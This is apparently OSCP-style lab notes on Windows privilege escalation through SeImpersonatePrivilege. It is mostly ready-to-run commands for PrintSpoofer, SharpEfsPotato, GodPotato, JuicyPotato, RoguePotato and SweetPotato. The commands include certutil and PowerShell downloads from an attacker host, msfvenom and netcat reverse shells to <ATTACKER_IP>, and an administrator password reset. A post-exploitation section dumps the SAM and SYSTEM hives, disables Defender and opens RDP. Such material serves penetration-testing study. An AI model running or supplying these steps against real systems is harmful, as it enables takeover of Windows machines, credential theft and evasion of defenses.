# SeImpersonatePrivilege — Privilege Escalation

## 🔍 Identify the Privilege

Chris is a normal user with no interesting groups. Running `whoami /priv`:

```cmd
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

> **`SeImpersonatePrivilege` — Enabled** is the interesting one here.

---

## 📖 What is SeImpersonatePrivilege?

`SeImpersonatePrivilege` allows a process to act on behalf of another user after successful authentication. In practice, it lets a service or program **"impersonate"** a client's security context to perform actions using that client's permissions.

This privilege is commonly assigned to:
- **IIS Application Pool** accounts (iis apppool\defaultapppool)
- **MSSQL Service** accounts
- **Network Service / Local Service** accounts
- **Service accounts** running web servers

📚 **Reference Blog:** [HackingArticles — Windows Privilege Escalation: SeImpersonatePrivilege](https://www.hackingarticles.in/windows-privilege-escalation-seimpersonateprivilege/)

---

## 🖥️ Identify System Architecture

```cmd
wmic os get osarchitecture
```

Also check OS version for choosing the right tool:

```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

---

## 🗺️ Which Tool to Use? (Decision Chart)

```
whoami /priv → SeImpersonatePrivilege Enabled
  │
  ├─ Check OS Version & Architecture
  │
  ├─ Windows 7 / Server 2008 / Server 2012
  │     └─ JuicyPotato (x86 or x64)
  │
  ├─ Windows 10 (1809+) / Server 2016 / Server 2019
  │     ├─ PrintSpoofer (x64)
  │     ├─ RoguePotato (x64)
  │     └─ SweetPotato (x64)
  │
  ├─ Windows 10 / 11 / Server 2022
  │     └─ GodPotato (x64)
  │
  └─ Not Sure / Multiple Failures
        ├─ SweetPotato (tries multiple techniques)
        └─ SharpEfsPotato (EfsRpc-based, widely compatible)
```

| Tool | Windows Version | Architecture |
|---|---|---|
| `JuicyPotato` | Windows 7/8, Server 2008/2012 | x86 / x64 |
| `PrintSpoofer` | Windows 10 (1809+), Server 2016/2019 | x64 |
| `RoguePotato` | Windows 10, Server 2019 | x64 |
| `GodPotato` | Windows 10/11, Server 2022 | x64 |
| `SweetPotato` | Multi-version (tries multiple) | x64 |
| `SharpEfsPotato` | Wide compatibility | x64 |

---

## 🚀 Method 1: PrintSpoofer64.exe

### How It Works
Abuses the **Print Spooler** service to capture a SYSTEM token via named pipe impersonation.

### Kali — Setup

```bash
cp /home/srahul/Desktop/OSCP+/ad-tools/printspoofer64.exe .
python3 -m http.server 80
```

### Target — Transfer & Execute

```cmd
cd C:\Users\chris\Desktop
certutil -urlcache -split -f http://<ATTACKER_IP>/printspoofer64.exe
```

**Direct command execution:**

```cmd
.\printspoofer64.exe -i -c whoami
.\printspoofer64.exe -i -c cmd
.\printspoofer64.exe -i -c powershell
```

**Change admin password:**

```cmd
.\printspoofer64.exe -i -c "net user administrator admin@1234"
```

**Reverse shell:**

```cmd
.\printspoofer64.exe -i -c "C:\temp\nc.exe <ATTACKER_IP> 4444 -e cmd.exe"
```

> ❌ **Result on this target:** `[-] Operation failed or timed out.`
> PrintSpoofer may fail if Print Spooler service is disabled or patched.

---

## 🚀 Method 2: SharpEfsPotato.exe

### How It Works
Abuses the **Encrypting File System Remote (EFSRPC)** protocol to force a SYSTEM-level authentication, then impersonates that token.

### Kali — Setup

```bash
cp /root/Desktop/OSCP+/ad-tools/SharpEfsPotato.exe .
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=445 -f exe -o reverse.exe
python3 -m http.server 80
```

### Target — Transfer

```cmd
cd C:\Users\chris\Desktop
certutil -urlcache -split -f http://<ATTACKER_IP>/SharpEfsPotato.exe
certutil -urlcache -split -f http://<ATTACKER_IP>/reverse.exe
```

### Kali — Start Listener

```bash
rlwrap nc -lvnp 445
```

### Target — Execute

```cmd
.\SharpEfsPotato.exe -p reverse.exe
```

> ✅ **Result:** Got reverse shell as `nt authority\system`

```cmd
cd C:\Users\Administrator\Desktop
type proof.txt
```

---

## 🚀 Method 3: GodPotato-Net4.exe

### How It Works
Exploits **DCOM/RPCSS** to create a SYSTEM token. Works on newer Windows versions where other potatoes fail.

### Kali — Setup

```bash
cp /home/srahul/Desktop/OSCP+/ad-tools/godpotato-net4.exe .
python3 -m http.server 80
```

### Target — Transfer & Execute

```cmd
cd C:\Users\chris\Desktop
certutil -urlcache -split -f http://<ATTACKER_IP>/godpotato-net4.exe
```

**Direct command execution:**

```cmd
.\godpotato-net4.exe -cmd "cmd /c whoami"
.\godpotato-net4.exe -cmd "cmd /c net user administrator admin@1234"
```

**Reverse shell:**

```cmd
.\godpotato-net4.exe -cmd "cmd /c C:\Users\chris\Desktop\nc.exe <ATTACKER_IP> 4444 -e cmd.exe"
```

**Add user to admin group:**

```cmd
.\godpotato-net4.exe -cmd "cmd /c net localgroup administrators chris /add"
```

> ✅ **Result:** The command completed successfully. Administrator password changed.

### RDP as Administrator

Since RDP (port 3389) is open from Nmap output:

```bash
xfreerdp3 /u:Administrator /p:admin@1234 /v:<TARGET_IP>
```

> ✅ **Result:** Got Administrator RDP Access!

---

## 🚀 Method 4: JuicyPotato.exe (x86 / Older Systems)

### How It Works
Abuses **COM servers** and impersonation to escalate. Requires a valid **CLSID** for the target OS. Does NOT work on Windows Server 2019+.

### Kali — Setup

```bash
cp /home/srahul/Desktop/OSCP+/ad-tools/JuicyPotato.exe .
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f exe -o reverse.exe
python3 -m http.server 80
```

### Target — Transfer & Execute

```cmd
certutil -urlcache -split -f http://<ATTACKER_IP>/JuicyPotato.exe
certutil -urlcache -split -f http://<ATTACKER_IP>/reverse.exe
```

**Find CLSID:** Use [ohpe/CLSID List](https://github.com/ohpe/juicy-potato/tree/master/CLSID) for your target OS.

```cmd
.\JuicyPotato.exe -l 1337 -p reverse.exe -t * -c {CLSID}
```

**Example with common CLSID:**

```cmd
.\JuicyPotato.exe -l 1337 -p reverse.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
```

### Kali — Listener

```bash
rlwrap nc -lvnp 4444
```

> **Note:** If one CLSID fails, try others from the list. Different CLSIDs work on different OS versions.

---

## 🚀 Method 5: RoguePotato.exe

### How It Works
Improved version of JuicyPotato. Abuses **DCOM** and the **OXID resolver** to trick the system into authenticating. Requires an attacker-controlled machine to redirect OXID resolution.

### Kali — Setup

```bash
# Start socat redirector on port 135
sudo socat tcp-listen:135,reuseaddr,fork tcp:<TARGET_IP>:9999 &

# Generate payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f exe -o reverse.exe
python3 -m http.server 80
```

### Target — Transfer & Execute

```cmd
certutil -urlcache -split -f http://<ATTACKER_IP>/RoguePotato.exe
certutil -urlcache -split -f http://<ATTACKER_IP>/reverse.exe
.\RoguePotato.exe -r <ATTACKER_IP> -e "reverse.exe" -l 9999
```

### Kali — Listener

```bash
rlwrap nc -lvnp 4444
```

---

## 🚀 Method 6: SweetPotato.exe

### How It Works
All-in-one tool that **combines multiple techniques** (PrintSpoofer, EfsPotato, and others). Tries them automatically until one works.

### Kali — Setup

```bash
cp /home/srahul/Desktop/OSCP+/ad-tools/SweetPotato.exe .
python3 -m http.server 80
```

### Target — Transfer & Execute

```cmd
certutil -urlcache -split -f http://<ATTACKER_IP>/SweetPotato.exe
```

**Direct command:**

```cmd
.\SweetPotato.exe -p reverse.exe
```

**Specific technique:**

```cmd
.\SweetPotato.exe -p reverse.exe -m printspoofer
.\SweetPotato.exe -p reverse.exe -m efspotato
.\SweetPotato.exe -p reverse.exe -m winstorage
```

> Best to try without `-m` flag first — it will auto-select the working method.

---

## 📊 Summary — Results on This Target

| Method | Tool | Result |
|---|---|---|
| Method 1 | PrintSpoofer64.exe | ❌ Failed — timed out |
| Method 2 | SharpEfsPotato.exe | ✅ Reverse shell as SYSTEM |
| Method 3 | GodPotato-Net4.exe | ✅ Changed admin password → RDP |
| Method 4 | JuicyPotato.exe | ⚠️ For older systems (x86/Server 2012) |
| Method 5 | RoguePotato.exe | ⚠️ Requires attacker-side redirector |
| Method 6 | SweetPotato.exe | ⚠️ Multi-technique, good fallback |

---

## 🔧 Common Post-Exploitation After SYSTEM

```cmd
# Dump hashes
reg save hklm\sam C:\temp\sam
reg save hklm\system C:\temp\system

# Add user to Administrators
net localgroup administrators <user> /add

# Enable RDP
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=yes

# Disable Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true

# Grab proof
type C:\Users\Administrator\Desktop\proof.txt
```

---

## 🔄 File Transfer Methods (Quick Reference)

```cmd
# Certutil
certutil -urlcache -split -f http://<ATTACKER_IP>/file.exe

# PowerShell
powershell -c "Invoke-WebRequest http://<ATTACKER_IP>/file.exe -OutFile file.exe"
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<ATTACKER_IP>/file.exe','file.exe')"

# Bitsadmin
bitsadmin /transfer job http://<ATTACKER_IP>/file.exe C:\temp\file.exe

# SMB (from Kali: impacket-smbserver share . -smb2support)
copy \\<ATTACKER_IP>\share\file.exe .
```

---

## 💡 Key Takeaways

- **Always try multiple tools** — PrintSpoofer may fail on certain configurations, but SharpEfsPotato or GodPotato might work
- **SharpEfsPotato** is great when you need a reverse shell
- **GodPotato** is great for quick command execution (e.g., changing passwords)
- **SweetPotato** is the best fallback — it tries multiple techniques automatically
- **JuicyPotato** is your go-to for older systems (Windows 7/8, Server 2008/2012)
- If RDP is open, changing the admin password and RDP-ing in is a clean method
- Use `rlwrap` with `nc` for better shell experience (arrow keys, history)
- Always check OS version before choosing a tool

---

## 🔗 Tool Download Links

| Tool | GitHub |
|---|---|
| PrintSpoofer | [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer) |
| SharpEfsPotato | [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato) |
| GodPotato | [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato) |
| JuicyPotato | [ohpe/juicy-potato](https://github.com/ohpe/juicy-potato) |
| RoguePotato | [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato) |
| SweetPotato | [CCob/SweetPotato](https://github.com/CCob/SweetPotato) |
| CLSID List | [ohpe/juicy-potato/CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID) |

---

## 📚 References

- [MITRE ATT&CK T1134.001 — Token Impersonation](https://attack.mitre.org/techniques/T1134/001/)
- [HackingArticles — SeImpersonatePrivilege](https://www.hackingarticles.in/windows-privilege-escalation-seimpersonateprivilege/)
- [PayloadsAllTheThings — Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)